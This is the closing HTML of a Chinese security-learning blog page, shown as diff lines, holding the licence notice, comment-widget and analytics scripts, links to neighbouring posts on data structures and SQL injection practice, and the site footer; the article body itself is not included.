+</ol>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Ab4nd0n</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://kongcm.cn/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/">http://kongcm.cn/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Ab4nd0n</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Web/">
+                                    <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                    <span class="chip bg-color">PHP反序列化</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'AxNbxfoIMrOxBzetVISTrmJe-gzGzoHsz',
+        appKey: 'A77RycvQsXl5xql5DXHq4Wj9',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+    
+</script>
+
+<!-- ֱ������ -->
+<div id="to_comment" class="comment-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#vcomments" title="ֱ������">
+        <i class="fas fa-comments"></i>
+    </a>
+</div>
+
+
+
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/03/16/DSQuestion/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/46.jpg" class="responsive-img" alt="数据结构疑问">
+                        
+                        <span class="card-title">数据结构疑问</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            记录《数据结构》中的一些问题
+1.时间复杂度O(1)与O(n)的区别？
+
+2.随机存取根据存储位置是否可计算（是否有一个计算地址的公式）来判断该数据结构是否具备随机存取的特性，如数组知道首地址就可计算后面所有元素的地址
+第四章  数组和特殊
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-16
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" class="post-category">
+                                    数据结构
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">
+                        <span class="chip bg-color">数据结构</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/10/18/sqlilab/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="sqli-labs-master 刷题记录">
+                        
+                        <span class="card-title">sqli-labs-master 刷题记录</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            注入的分类注入的分类：数字型和字符型。攻击者目的只有一点，那就是绕过程序的限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限。
+1、数字型注入当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。
+
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-10-18
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('2'),
+            headingSelector: 'h1, h2, h3, h4, h5, h6'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4, h5, h6').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="/about" target="_blank">Ab4nd0n</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">41.9k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "6";
+                    var startDate = "28";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+            <span id="icp"><img src="/medias/icp.png" style="vertical-align: text-bottom;" />
+                <a href="/null" target="_blank">苏ICP备2020057407号</a>
+            </span>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:2829493640@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2829493640" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2829493640" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+<script src="/js/prism/prism.js" async></script>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <script src="/js/FunnyTitle.js"></script>
+    
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+            i["DaoVoiceObject"] = r;
+            i[r] = i[r] || function () {
+                (i[r].q = i[r].q || []).push(arguments)
+            }, i[r].l = 1 * new Date();
+            a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+            a.async = 1;
+            a.src = g;
+            a.charset = "utf-8";
+            m.parentNode.insertBefore(a, m)
+        })(window, document, "script", ('https:' == document.location.protocol ? 'https:' : 'http:') +
+            "//widget.daovoice.io/widget/6984b559.js", "daovoice")
+        daovoice('init', {
+            app_id: "96bb8160"
+        });
+        daovoice('update');
+    </script>
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+    <!-- <script type="text/javascript">
+        //ֻ���������ҳ������Ч
+        var windowWidth = $(window).width();
+        if (windowWidth > 768) {
+            document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+        }
+        </script> --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+        
+
+</body>
+
+</html>
